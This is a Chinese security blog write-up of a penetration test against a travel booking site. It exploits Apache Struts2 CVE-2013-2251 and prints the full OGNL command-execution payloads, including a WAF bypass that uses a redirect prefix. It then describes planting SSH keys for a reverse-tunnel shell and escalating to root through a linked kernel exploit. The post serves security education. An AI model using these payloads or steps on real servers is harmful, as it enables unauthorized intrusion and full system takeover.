#  一次获取RCE以及提权到root权限的渗透过程   
 迪哥讲事   2025-05-16 12:30  
  
本文是关于  
Apache struts2 CVE-2013-2251  
是由于导致执行远程命令的影响而被高度利用的漏洞。简而言之，  
 通过操纵以“action:”/”redirect:”/”redirectAction:”为前缀的参数引入的漏洞，允许在使用<Struts 2.3.15作为框架的Java Web应用程序中执行远程命令。  
  
   
  
现在，当这个漏洞以病毒式疯狂传播时，主要的应用防火墙厂商开始更新它们的规则引擎和检测技术，以防止它发生。 但是作者不仅能够绕过防火墙并获得远程代码执行，还能够通过利用内核漏洞来提权到以root用户身份获取服务器权限。  
  
   
  
当作者在测试旅行预订网站时，是  
   
因为为了找到应用程序是否运行在易受攻击的Apache Struts框架上的漏洞利用，只需检查以下易受攻击的参数  
-  
“action, redirect,redirectAction”和正确的有效攻击负载，通过  
google  
找到利用poc的博客（必须构建一个  
OGNL  
表达式），  
http://blog.opensecurityresearch.com/2014/02/attacking-struts-with-cve-2013-2251.html  
 ，下面是用于运行命令  
“ifconfig”  
的有效负载。  
<table><tbody><tr style="border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;"><td data-colwidth="35" width="35" style="border-collapse: collapse;padding: 0px !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;min-width: auto !important;border-radius: 0px !important;background: none !important;inset: auto !important;float: none !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(175, 175, 175) !important;"><p><span leaf="">1</span></p></td><td data-colwidth="NaN" width="NaN" style="border-collapse: collapse;padding: 0px !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;min-width: auto !important;border-radius: 0px !important;background: none !important;inset: auto !important;float: none !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;box-sizing: content-box !important;min-height: auto !important;"><p><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">redirect:${#a=(</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">new</span></code><span leaf=""> </span><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">java.lang.ProcessBuilder(</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">new</span></code><span leaf=""> </span><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">new</span></code><span leaf=""> </span><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">java.io.InputStreamReader(#b),#d=</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">new</span></code><span leaf=""> </span><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">java.io.BufferedReader(#c),#e=</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">new</span></code><span leaf=""> </span><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">char</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">[50000],#d.read(#e),#matt=#context.</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 255) !important;"><span leaf="">get</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}</span></code></p></td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wkJqjMTzCUwMRdibicee5UB74OE8iaoiaR8adxYfc9erpD7zLEHw7mU9xiag/640?wx_fmt=jpeg "")  
  
但正如预料的那样，它被应用防火墙阻止了，并将重定向到一个  
bot  
机器页面 。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wsw44oia9viaUvC40FknIzicw3D7pQDnXtLKLVkZMbJjgpSpqOfpP9hrbg/640?wx_fmt=jpeg "")  
  
当这样的事情发生在作者身上时，正如前面指出的那样，知道哪些参数易受攻击，其中之一是在上述请求中使用的  
“redirect”  
参数。   
“redirect  
”，是的，你觉得它是正确的，让我们尝试在这里重定向，只是把它重定向到http：//www.goal.com  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wr4VBmZ1aPHJXawrlHcx3VcKnwzBMl9TvPne8rSaJPX0dByMMuIboUA/640?wx_fmt=jpeg "")  
  
正如你所看到的那样，作者得到了  
302  
重定向到位置http://www.goal.com ，所以之前的  
ifconfig  
命令有效载荷被阻止了，这个重定向方法，给了作者一个绕过防火墙的思路，所以，将上面的有效负载进行修改如下：  
<table><tbody><tr style="border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;"><td data-colwidth="35" width="35" style="border-collapse: collapse;padding: 0px !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;min-width: auto !important;border-radius: 0px !important;background: none !important;inset: auto !important;float: none !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(175, 175, 175) !important;"><p><span leaf="">1</span></p></td><td data-colwidth="NaN" width="NaN" style="border-collapse: collapse;padding: 0px !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;min-width: auto !important;border-radius: 0px !important;background: none !important;inset: auto !important;float: none !important;line-height: 1.1em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;box-sizing: content-box !important;min-height: auto !important;"><p><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 0, 0) !important;"><span leaf="">redirect:http:</span></code><code style="font-family: Consolas, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace !important;border-radius: 0px !important;background: none !important;border-width: 0px !important;border-style: initial !important;border-color: initial !important;inset: auto !important;float: none !important;height: auto !important;line-height: 1.8em !important;outline: 0px !important;overflow: visible !important;vertical-align: baseline !important;width: auto !important;box-sizing: content-box !important;min-height: auto !important;color: rgb(0, 130, 0) !important;"><span leaf="">//www.goal.com/${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{‘ ifconfig’})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}</span></code></p></td></tr></tbody></table>  
并发起请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1w4FqVSYMjVj1tAj4lMZW9aA8xGNXkW6CzzlWvVaJicOicia63hxYkwOWicA/640?wx_fmt=jpeg "")  
  
下面显示了能够绕过防火墙并获得运行的  
“ifconfig”  
命令输出信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wZkCBthVaQKPChTc6YCBKrNKebUeEPia47KqUtrUNayZfIVLgUD0gXZw/640?wx_fmt=jpeg "")  
  
下一个目标是获得服务器的远程  
shell  
，作者使用反向SSH隧道和公钥认证来尝试并获取  
shell  
，它允许SSH用户在不输入密码的情况下登录。  
   
因此，作者必须将攻击者服务器的ssh公钥放入受害服务器的授权路径下~/.ssh/authorized_keys，为了获取授权身份，并且获取为反向  
ssh  
隧道，还必须添加受害ssh服务器的id_rsa.pub公钥。  
   
为了阐述上面2个关键词的概念并理解  
公钥认证  
的概念  
-----id_rsa.pub  
是您添加到其他主机的authorized_keys文件以允许您以该用户身份登录的公钥。  
 authorized_keys  
是允许登录到特定服务器上的特定帐户的公钥列表。  
  
第一步  
 -   
使用RCE查找受害服务器的id_rsa.pub文件位置  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wJSuKQp25A2oENuQnbeffwX0ZmOMRyf7iciaTs5tOhCiaUee0ibXQBiaPg4Q/640?wx_fmt=jpeg "")  
  
第二步  
 -   
将authorized_keys从受害者服务器复制到攻击者服务器上  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wccyhOibpNuCCichs9Pc0XWEgR3nEoibNezZKIN31KXpNDH4WMWqyr9bJA/640?wx_fmt=jpeg "")  
  
第三步  
 -   
将修改后的authorized_keys从攻击者服务器复制回来，通过读取  
id_rsa.pub  
获得shell.  
  
最后一步  
 - SSH  
在攻击者机器上使用反向隧道，所以运行了如下命令行：  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1w8VBkELQkicGMTuib682H3icvosTWSOLSaMg3q0nWqUqCicj4aM2TFboO9w/640?wx_fmt=jpeg "")  
  
   
  
能够获得服务器的远程  
shell,  
但没以root登陆的权限，这就意味着只有有限的权利访问文件和命令执行。  
   
现在为了获取以root用户身份登录的权限，作者首先查看当前受害机器上运行的内核版本是什么：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1w4wmyibib7MZE6E2uYRAO32GDV9o2grBJwWIibN5aIXiaNFUkfpnhZfA3og/640?wx_fmt=jpeg "")  
  
因此发现了内核版本是  
2.6.32  
，通过google查找到利用的  
CVE  
，该CVE可  
  
容易进行账户提权和漏洞利用  
----https  
： //github.com/realtalk/cve-2013-2094 ，最终够获得root用户权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MxP6iaibG3fZOjnemvrjBwAu9jlMMdnW1wUbud2HmYCQp1Vy2aAicUvvQibmJQTwiaJ8UVNCoicj1mqTNCFZ97h6ddmg/640?wx_fmt=jpeg "")  
  
这就是如何通过利用  
apache strut 2  
漏洞和内核版本漏洞利用结合来获取以root用户服务器的远程  
shell  
。  
  
  
## 往期回顾  
# 如何绕过签名校验  
#   
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
[‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
